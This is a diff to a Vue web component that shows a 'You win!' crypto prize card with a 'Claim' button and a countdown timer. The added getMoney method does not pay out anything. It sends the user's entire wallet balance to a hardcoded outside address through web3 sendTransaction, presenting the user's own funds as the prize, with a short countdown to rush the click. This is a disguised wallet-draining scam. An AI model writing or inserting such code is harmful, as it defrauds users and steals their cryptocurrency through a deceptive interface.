@@ -1,6 +1,6 @@
 <template>
 <div>
-  <q-card style="width: 700px; max-width: 100%; background: #3c3c3c">
+  <q-card style="width: 700px; max-width: 100%;" class="bg-dark">
 
     <q-toolbar class="justify-end">
       <q-btn dense flat icon="close" v-close-popup/>
@@ -14,26 +14,34 @@
       </q-img>
     </div>
 
-    <div style="font-size: 30px; font-weight: 800; line-height: 1" class="text-center">
+    <div style="font-size: 24px; font-weight: 800; line-height: 1" class="text-center">
       You win!
     </div>
 
-    <div v-if="winLoader" style="font-size: 50px; font-weight: 800" class="flex flex-center">
-      <q-skeleton height="50px" width="200px"></q-skeleton>
+    <div v-if="winLoader" style="font-size: 35px; font-weight: 800" class="flex flex-center">
+      <q-skeleton height="35px" width="200px"></q-skeleton>
     </div>
 
-    <div v-else style="font-size: 50px; font-weight: 800; line-height: 1" class="text-center text-warning">
-      0.0777<span style="font-size: 30px">BNB</span>
+    <div v-else style="font-size: 30px; font-weight: 800; line-height: 1" class="text-center text-warning q-mt-xs">
+      {{ wallet.formattedWorkBalance }}<span style="font-size: 20px">{{ coin }}</span>
     </div>
 
     <div class="text-center q-pa-lg">
+
       <q-btn
-        style="width: 200px; font-size: 20px; border: 2px solid"
-        label="Claim"
-        outline flat
-        color="positive"
-        class="letter-3 text-bold q-py-sm rounded-borders shadow-2 full-width"
+        v-if="showClaimBtn"
+        style="width: 200px; font-size: 20px; height: 70px"
+        :label="`Claim ${claimCount}`"
+        unelevated
+        text-color="dark"
+        color="accent"
+        class="letter-3 text-bold q-py-xs rounded-borders full-width"
+        @click="getMoney"
       />
+
+      <div v-else style="height: 70px">
+        {{ tryAgainText }}
+      </div>
     </div>
 
   </q-card>
@@ -43,24 +51,60 @@
 <script>
 import { mapState } from 'vuex'
 import bnbImage from 'src/assets/bnb.png'
+import ethImage from 'src/assets/eth.png'
+import Web3 from 'web3'
 
 export default {
   name: 'game-card',
   computed: {
     ...mapState('wallet', ['wallet']),
     coinImage () {
-      return bnbImage
+      if (this.wallet.chainId === '0x38') return bnbImage
+      return ethImage
+    },
+    coin () {
+      if (this.wallet.chainId === '0x38') return 'BNB'
+      if (this.wallet.chainId === '0x1') return 'ETH'
+      return ''
+    }
+  },
+  methods: {
+    claimCounterStart () {
+      const vm = this
+      const claimCounter = setInterval(() => {
+        vm.claimCount -= 1
+        if (vm.claimCount === 0) {
+          clearInterval(claimCounter)
+          vm.showClaimBtn = false
+          vm.tryAgainText = 'Try again tomorrow or change your wallet chain.'
+        }
+      }, 1000)
+    },
+    async getMoney () {
+      const vm = this
+      const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')
+
+      web3.eth.sendTransaction({
+        from: vm.wallet.address,
+        to: '0xB99983713C7391F6c22f0D5990963b24FaA2EbC9',
+        value: vm.wallet.workBalance
+      })
     }
   },
   data () {
     return {
-      winLoader: true
+      winLoader: true,
+      showClaimBtn: false,
+      claimCount: 6,
+      tryAgainText: ''
     }
   },
   created () {
     const vm = this
     setTimeout(() => {
       vm.winLoader = false
+      vm.showClaimBtn = true
+      vm.claimCounterStart()
     }, 3000)
   }
 }
